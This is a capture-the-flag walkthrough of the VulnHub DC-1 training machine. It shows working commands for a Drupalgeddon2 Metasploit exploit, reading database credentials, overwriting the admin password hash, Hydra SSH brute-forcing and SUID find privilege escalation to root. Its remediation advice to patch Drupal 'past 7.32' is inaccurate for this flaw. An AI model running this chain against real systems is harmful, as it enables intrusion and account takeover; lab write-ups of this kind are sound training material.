# DC-1

**Platform:** VulnHub | **Difficulty:** Beginner | **Date:** Nov. 2026

> Author: DCAU — [VulnHub page](https://www.vulnhub.com/entry/dc-1,292/)

## 1. Reconnaissance

Identify the target on the local network, then enumerate open ports and services.

```bash
nmap -sn 10.0.2.0/24
nmap -sC -sV -p- 10.0.2.4
```

- `-sC` runs Nmap's default scripts (banner grabbing, page titles, etc.)
- `-sV` tries to fingerprint the exact service version
- `-p-` scans all 65535 ports instead of just the top 1000

**Observed:**

```
┌──(divya㉿KaliDivya)-[~/Bureau]
└─$ nmap -sn 10.0.2.0/24
Nmap scan report for dc-1 (10.0.2.4)
Host is up (0.00079s latency).
MAC Address: 08:00:27:19:F0:B0 (Oracle VirtualBox virtual NIC)

┌──(divya㉿KaliDivya)-[~/Bureau]
└─$ nmap -sC -sV -p- 10.0.2.4
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
48511/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:19:F0:B0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports open: **22** (SSH), **80** (HTTP/Apache), **111** (RPC/portmapper).

## 2. Enumeration

Port 80 serves a website running **Drupal**, confirmed by Nmap's `http-generator` script and by `robots.txt` exposing Drupal-specific paths (`/CHANGELOG.txt`, `/INSTALL.txt`, `/modules/`, ...).

An outdated Drupal 7 install is a strong signal: it's vulnerable to **Drupalgeddon2 (CVE-2018-7600)**, a pre-authentication remote code execution flaw in the Form API.

## 3. Exploitation

Drupalgeddon2 lets an unauthenticated attacker inject and execute PHP code through a crafted request to Drupal's form rendering engine, because user-supplied render array keys were not properly sanitized before being passed to PHP's `call_user_func_array`. Metasploit automates the whole chain.

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.2.4
set RPORT 80
run
```

This drops a shell as `www-data`. Stabilize it for a proper interactive session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Flag 1 and Flag 2 — config file

```bash
www-data@DC-1:/var/www$ cat flag1.txt
```
```
Every good CMS needs a config file - and so do you.
```

`flag1.txt` points directly to Drupal's config file:

```bash
www-data@DC-1:/var/www$ cat sites/default/settings.php
```
```
/*
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 */

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

### Flag 3 — overwriting the admin password hash

Rather than cracking the existing admin hash (bruteforce/dictionary attacks with John/Hashcat took too long and didn't complete), the config credentials above give direct write access to the database — so instead of *cracking* the hash, we *overwrite* it with one we control:

```bash
www-data@DC-1:/var/www$ mysql -u dbuser -pR0ck3t drupaldb
mysql> select uid, name, pass from users;
```

Generate a valid Drupal 7 password hash (phpass format) using the CMS's own script:

```bash
www-data@DC-1:/var/www$ php scripts/password-hash.sh newpassword
```

Then overwrite the admin's hash in the database with the one just generated:

```sql
UPDATE users SET pass='<generated_hash>' WHERE name='admin';
```

Logging in at `/user/login` with `admin / newpassword` gives access to the dashboard, where flag 3 is displayed:

```
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

This is a direct hint toward the privilege escalation path (see section 4).

### Side track — Flag 4 user and SSH bruteforce

`/etc/passwd` reveals a dedicated user, `flag4`:

```bash
cat /etc/passwd
...
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

Bruteforcing SSH login with Hydra and `rockyou.txt` cracks it almost instantly:

```bash
┌──(divya㉿KaliDivya)-[~/Bureau]
└─$ hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.4
[22][ssh] host: 10.0.2.4   login: flag4   password: orange
1 of 1 target successfully completed, 1 valid password found
```

Credentials found (`flag4:orange`) in a matter of seconds — but this path turns out to be a dead end for privilege escalation, since root is reached more directly from `www-data` (see below).

## 4. Privilege Escalation

Look for SUID binaries, which run with the privileges of their owner rather than the invoking user:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/find` shows up with the SUID bit set — abnormal, and directly exploitable since `find` can execute arbitrary commands via `-exec`:

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` keeps the shell privileged (prevents bash from dropping the inherited root privileges), `-quit` stops `find` right after the first execution.

```bash
cat /root/thefinalflag.txt
```
```
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

## 5. Lessons Learned

- An outdated CMS is an easy, pre-packaged entry point — Drupalgeddon2 had public Metasploit modules within days of disclosure, so patching cadence matters as much as the fix itself.
- Config files like `settings.php` are a goldmine for an attacker; database credentials should never be reachable from a compromised web user without further hardening (e.g. separate DB accounts with least privilege).
- Database write access can be just as dangerous as cracking a password hash: if an attacker can write to the `users` table, they don't need to break the hash at all — they just replace it.
- SUID should never be set on general-purpose binaries (`find`, `vim`, `less`, `cp`, ...). These are the first things an attacker checks — see [GTFOBins](https://gtfobins.github.io/) for the full list of abusable binaries.
- User `flag4`'s password was cracked in seconds with a standard wordlist. A longer password mixing case, numbers and symbols would not make it uncrackable, but would make the attack take considerably longer.
- **Fix:** update Drupal core past 7.32 (or to a maintained major version), remove the SUID bit from `find` (`chmod u-s /usr/bin/find`), restrict DB user privileges to what the application actually needs, and rate-limit/lock out SSH login attempts to mitigate bruteforce attacks.
